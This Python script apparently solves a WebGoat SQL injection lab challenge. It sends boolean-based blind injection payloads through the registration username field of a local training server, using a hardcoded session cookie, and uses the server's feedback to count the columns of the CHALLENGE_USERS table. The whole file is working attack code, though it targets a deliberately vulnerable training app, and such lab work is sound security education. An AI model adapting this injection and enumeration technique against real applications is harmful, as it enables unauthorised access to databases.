import json
import requests

#Vulnerable endpoint URL
URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'

#Request headers
HEADERS = {
    'Cookie': "JSESSIONID=stwGcaftyQKVEJJ0zFtNGJXVBHNWGCfPLJnWcWBG",  
}


#Function to send SQL injection request and return the response
def send_sql_injection(payload):
    """
    Send a SQL injection payload through an HTTP request to the vulnerable application.
    """
    data = {
        'username_reg': payload,
        'email_reg': 'test@test.com',
        'password_reg': 'test123',
        'confirm_password_reg': 'test123'
    }

    try:
        #Send the request and return the response
        response = requests.put(URL, headers=HEADERS, data=data)
        return response
    except requests.RequestException as e:
        print(f"Error during the request: {e}")
        return None


#Function to check if the response indicates a valid column count
def is_valid_column_count(response):
    """
    Determines whether the web application's response indicates the correct column count.
    """
    try:
        response_json = json.loads(response.text)
        return "already exists please try to register with a different username" in response_json.get('feedback', '')
    except json.JSONDecodeError:
        print("Invalid session or request format.")
        return False


#Function to find the number of columns in the CHALLENGE_USERS table
def find_column_count():
    """
    Determines the number of columns in the 'CHALLENGE_USERS' table by incrementally testing column counts
    using SQL injection until the correct count is found.
    """
    column_count = 0

    while True:
        #Constructing SQL payload for counting columns
        payload = f"tom' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='CHALLENGE_USERS') = {column_count};--"

        #Send the request and get the response
        response = send_sql_injection(payload)
        if response is None:
            return

        #Check if the response confirms the correct column count
        if is_valid_column_count(response):
            print(f"Number of columns in CHALLENGE_USERS: {column_count}")
            break
        else:
            column_count += 1


#Execute function to determine the column count
find_column_count()